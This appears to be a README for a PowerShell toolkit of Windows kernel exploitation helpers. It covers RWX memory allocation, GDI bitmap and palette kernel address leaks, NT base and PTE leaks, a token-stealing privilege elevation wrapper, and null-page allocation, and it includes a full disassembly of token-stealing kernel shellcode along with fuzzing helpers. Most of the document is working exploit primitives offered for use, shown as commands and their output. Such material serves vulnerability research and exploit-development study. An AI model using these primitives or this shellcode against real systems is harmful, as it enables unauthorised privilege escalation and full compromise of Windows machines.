# PSKernel-Primitives

Over time I'll add PowerShell helper functions to assist in kernel exploitation.

## Common PowerShell Exploit Constructs

### Create buffer

```powershell
# Byte buffer int/hex
$Buff = [Byte[]](0x41)*255 + [Byte[]](0x42)*0xff

# Buffer includes pointer
# Takes care of endianness, may need ".ToInt32()" or ".ToInt64()"
$Buff = [Byte[]](0x41)*255 + [System.BitConverter]::GetBytes($Pointer)
```

### Pointer to alloc bytes

```powershell
# (1) Virtual alloc -> MEM_COMMIT|MEM_RESERVE & PAGE_EXECUTE_READWRITE
# Call VirtualFree to release
[IntPtr]$Pointer = [Kernel32]::VirtualAlloc([System.IntPtr]::Zero, $Bytes.Length, 0x3000, 0x40)
# (2) AllocHGlobal
[IntPtr]$Pointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Pointer, $Bytes.Length)
```

### Read DWORD/QWORD

```powershell
# DWORD
$Val = [System.Runtime.InteropServices.Marshal]::ReadInt32($Address)

# QWORD
$Val = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address)
```

### Pointer <-> structure

```powershell
# Pointer to PowerShell struct
$SomeStruct = New-Object SomeStruct
$SomeStruct_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($SomeStruct) # if needed
$SomeStruct = $SomeStruct.GetType()
$SystemPointer = New-Object System.Intptr -ArgumentList $Address
$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SomeStruct)

# PowerShell struct to Pointer
$SomeStructSize = [System.Runtime.InteropServices.Marshal]::SizeOf($SomeStruct)
[IntPtr]$Pointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SomeStructSize)
[system.runtime.interopservices.marshal]::StructureToPtr($SomeStruct, $Pointer, $true)
```

### Add elements to custom PowerShell object

```powershell
# You can loop this is a for or while to add entries to $Result
$Result = @()
$HashTable = @{
	Element1 = "Val"
	Element2 = "Val"
	Element3 = "Val"
}
$Object = New-Object PSObject -Property $HashTable
$Result += $Object
```

### Handle to current process

```powershell
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
```

### Loop based on time

```powershell
$Timer = [diagnostics.stopwatch]::StartNew()
while ($Timer.ElapsedMilliseconds -lt 10000) {
	#...Something...
}
$Timer.Stop()
```

### Simulate threading with runspaces

```powershell
$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.Open()
$RaceCondition = [powershell]::Create()
$RaceCondition.runspace = $Runspace
[void]$RaceCondition.AddScript({
	param($SomeExternalVar1,$SomeExternalVar2)

	# Do some stuff here

	while ($true) {

		# And/or do some stuff in a loop
		
	}
}).AddArgument($SomeExternalVar1).AddArgument($SomeExternalVar2)
$AscObj = $RaceCondition.BeginInvoke()

# Some condition to fulfill

# Kill the runspace
$SizeRace.Stop()
```

### Get Winver version output

```powershell
$WinVer = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\").ReleaseId
```

### VirtualKD -> KD not loading on boot Win10

```
bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200
```

## Kernel Helper Functions

### Stage-HmValidateHandlePalette
Universal x64 Palette leak using HmValidateHandle. Includes tagTHREADINFO pointer to facilitate low integrity EPROCESS leak.

Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3

```
PS C:\Users\b33f> Stage-HmValidateHandlePalette

tagTHREADINFO    : -6813887409648
cEntries         : -6813890109412
pFirstColor      : -6813890109320
PaletteKernelObj : -6813890109440
PaletteHandle    : 1007159191

PS C:\Users\b33f> $Manager = Stage-HmValidateHandlePalette
PS C:\Users\b33f> "{0:X}" -f $Manager.pFirstColor
FFFFF9CD84802078
```

### Get-Handles

Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process.

Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3

```
C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
C:\PS> $Key = $SystemProcHandles |Where-Object {$_.ObjectType -eq "Key"}
C:\PS> $Key |ft

ObjectType AccessMask PID Handle HandleFlags KernelPointer
---------- ---------- --- ------ ----------- -------------
Key        0x00000000   4 0x004C NONE        0xFFFFC9076FC29BC0
Key        0x00020000   4 0x0054 NONE        0xFFFFC9076FCDA7F0
Key        0x000F0000   4 0x0058 NONE        0xFFFFC9076FC39CE0
Key        0x00000000   4 0x0090 NONE        0xFFFFC907700A6B40
Key        0x00000000   4 0x0098 NONE        0xFFFFC90770029F70
Key        0x00020000   4 0x00A0 NONE        0xFFFFC9076FC9C1A0
                     [...Snip...]
```

### Pointer-Leak

Pointer-Leak is a wrapper for various types of pointer leaks, more will be added over time.

Methods:

* NT kernel base leak through the TEB (by @Blomster81)
  * Properties: Requires GDI primitive => LowIL compatible
  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3

* PTE leak through nt!MiGetPteAddress (by @Blomster81 & @FuzzySec)
  * Properties: RS1+ requires GDI primitive, NT Kernel base => LowIL compatible
  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3

```
# NT Kernel base leak
PS C:\Users\b33f> Pointer-Leak -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -LeakType TebNtBase -GDIType Bitmap

KTHREAD   : -35184359294848
TEBBase   : 140699435483136
NtPointer : -8787002226668
NtBase    : -8787003412480

# PTE leak
PS C:\Users\b33f> Pointer-Leak -GDIManager $Manager.PaletteHandle -GDIWorker $Worker.PaletteHandle -NtBase $NTLeak.NtBase -VirtualAddress 0xFFFFF78000000800 -LeakType MiGetPteAddress -GDIType Palette

PTEBase    : -10445360463872
PTEAddress : -9913858260992
```

### Get-KernelShellCode

Generate x32/64 Kernel token stealing shellcode.

Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2

```
# x64 Win10 RS2
PS C:\Users\b33f> $sc = Get-KernelShellCode
PS C:\Users\b33f> Get-CapstoneDisassembly -Architecture CS_ARCH_X86 -Mode CS_MODE_64 -Bytes $sc

Address  Instruction
-------  -----------
0x100000 mov r9, qword ptr gs:[0x188]
0x100009 mov r9, qword ptr [r9 + 0x220]
0x100010 mov r8, 0x2dbc
0x100017 mov rax, r9
0x10001A mov rax, qword ptr [rax + 0x2e8]
0x100021 sub rax, 0x2e8
0x100027 cmp qword ptr [rax + 0x2e0], r8
0x10002E jne 0x10001a
0x100030 mov rcx, rax
0x100033 add rcx, 0x358
0x10003A mov rax, r9
0x10003D mov rax, qword ptr [rax + 0x2e8]
0x100044 sub rax, 0x2e8
0x10004A cmp qword ptr [rax + 0x2e0], 4
0x100052 jne 0x10003d
0x100054 mov rdx, rax
0x100057 add rdx, 0x358
0x10005E mov rdx, qword ptr [rdx]
0x100061 mov qword ptr [rcx], rdx
0x100064 ret
```

### Get-LoadedModules

Gets the base of all loaded modules. For Low integrity this only works pre Win 8.1.

```
C:\PS> $Modules = Get-LoadedModules
C:\PS> $Modules[4]

ImageSize    ImageName                                     ImageBase
---------    ---------                                     ---------
0x5C000      \SystemRoot\System32\drivers\CLFS.SYS    -8246323585024

C:\PS> "{0:X}" -f $Modules[0].ImageBase
FFFFF8030460B000
```

### Stage-HmValidateHandleBitmap
Universal x64 Bitmap leak using HmValidateHandle. Includes tagTHREADINFO pointer to facilitate low integrity EPROCESS leak.

Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2

```
PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl

tagTHREADINFO   : -7693316289488
BitmappvScan0   : -7693315010480
BitmapKernelObj : -7693315010560
BitmapHandle    : 419758522

PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
FFFFE0BF0094A000
```

### Stage-gSharedInfoBitmap

Universal x32/x64 Bitmap leak using gSharedInfo.

Targets: 7, 8, 8.1, 10, 10 RS1

```
PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl

BitmapKernelObj : -7692235059200
BitmappvScan0   : -7692235059120
BitmapHandle    : 1845828432

PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
FFFFF901030FF000
```

### Stage-BitmapReadWrite

Universal x32/x64 Bitmap leak using PEB.

Targets: 7, 8, 8.1, 10

```
C:\PS> Stage-BitmapReadWrite

ManagerpvScan0       : -7692227456944
WorkerHandleTable    : 767454567328
ManagerKernelObj     : -7692227457024
PEB                  : 8757247991808
WorkerpvScan0        : -7692227415984
ManagerHandle        : -737866269
WorkerHandle         : 2080706172
GdiSharedHandleTable : 767454478336
ManagerHandleTable   : 767454563656
WorkerKernelObj      : -7692227416064

C:\PS> $BitMapObject = Stage-BitmapReadWrite
C:\PS> "{0:X}" -f $BitMapObject.ManagerKernelObj
FFFFF9010320F000
```

### GDI-Elevate

A token stealing wrapper for x32/64 which ingests a handle to a manager and worker GDI object.

Note that this function has two methods, if supplied with a pointer to an arbitrary tagTHREADINFO object it can elevate the current process from low integrity. Without the tagTHREADINFO pointer it relies on NtQuerySystemInformation (Get-LoadedModules) to leak the base address of the ntkernel which requires medium integrity on Win8.1+.

```
# MedIL token theft
C:\PS> GDI-Elevate -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -GDIType Bitmap

# LowIL token theft
C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Bitmap -ThreadInfo $ManagerPalette.tagTHREADINFO

```

### Alloc-NullPage

Wrapper to allocate the process null page on Win 7 32bit.

```
# Read
PS C:\> $NullPage = Alloc-NullPage -Bytes 1024
PS C:\> if ($NullPage -eq $true) {...} else {...}
```

### Get-SyscallDelegate

Allocate 32/64 bit shellcode and get a Syscall delegate for the memory pointer.

```
# Sample definition for NtWriteVirtualMemory
C:\PS> $NtWriteVirtualMemory = Get-SyscallDelegate -ReturnType '[UInt32]' -ParameterArray @([IntPtr],[IntPtr],[IntPtr],[int],[ref][int])

# Syscall ID = 0x37 (Win7)
C:\PS> $NtWriteVirtualMemory.Invoke([UInt16]0x37,[IntPtr]$hProcess,[IntPtr]$pBaseAddress,[IntPtr]$pBuffer,$NumberOfBytesToWrite,[ref]$OutBytes)
```

## Fuzz Helpers

### Get-FuzzedInt

Returns fuzzed values for various types of integers with a preference for "beautiful"(?) values.

```
PS C:\Users\b33f> for ($i=0;$i-lt10;$i++) { Return-Int16 }
-31622
19309
8192
128
-32329
32758
7294
-32277
-4272
-32768
PS C:\Users\b33f> for ($i=0;$i-lt10;$i++) { "{0:X}" -f $(Return-UInt32) }
0
400000
4000000
200
FF3FC000
FF007F80
800
0
FFFFFFFF
4000000
```

### Get-FuzzedString

Returns 3 types of strings, AlphaNum, Full ASCII and Unicode. Needs wrappers to marshal strings as AnsiBStr, BStr, LPStr, LPTStr, LPWStr, TBStr and UNICODE_STRING.

```
PS C:\Users\b33f> Return-AlphaNum -Maxlen 200
ej3vx38XQ3Kr24b6F5JFs0FIO16rGg5xGO6kLk0FULE2v76Rt11o6566ewRWE5J1pcf40q38868n

PS C:\Users\b33f> Return-AlphaNum -Maxlen 200
35c7UU4X17yLHlixrYwUa1t6D2KpEGQOwY

PS C:\Users\b33f> Return-AlphaNum -Maxlen 200
2XuHMUn4J6lESFNUOPf8S30Qy20Q4Q2TmWNv78hNO840SX365pmo23EC2eURY0K4E73wIOVUUyA324EY7S8V7Jxv0XL50hPsabLX7

PS C:\Users\b33f> Return-FullASCII
pA#`df4A~0VQ|\

PS C:\Users\b33f> Return-FullASCII
c0PL-`<$h9m1I3t]
'

PS C:\Users\b33f> Return-Unicode 500
�搂ዴ南觐ቃ᱕懮놋Ŕ矶폧䩶∺緈憚캵鄟殫䩐ﺕ趂◪엏趨父邂ﲞ䥊層㮶䃐ゎ墜�ꇏ�࠽�Ꜯ뻹漷ᷨᖲ坞뤂勈᩹慧�ؘ쎛흗䅍핪ҡ맹뱍㑛庛到ᖤ祪്졗碒㣒
쁸稝᪆䀔㥻ҋ珖瞓ᔥї셵䣪鈐൤㲚췵⃙톷ꬢ툼햓ꋂ峱透䋞꫟�꽏樬፽趣⻹믲톄州岝衼ᘧ棶諌늝핞䛚铵䄇蛵㽟謓⨮遮ㄆ닊ⴵ梑敌掑땓찕毳狯莇鸈ꢏ锜
ꔤ㓱ڃຨ㿊㓦䑈⽌䳩掍㢟骉Ⳟ䃥㳏᧱㊺祫푹邠늝�≒ƿࡋ㟸닯當鐋卫猗됔䊋Ƥ弬圦郂㙲崘䑚댜Ꞥ䵃毧Ⱦ讹�ሢꉮ綟ᖴ뾩⎥䍐＇狱俗먟ꓛ돲䴄錩
昇嚺쓫䂌咣嗢眇ᗠ肎읭굻㮞ᗥთ㚼ꇭ盏ꀣ⦟礎
```
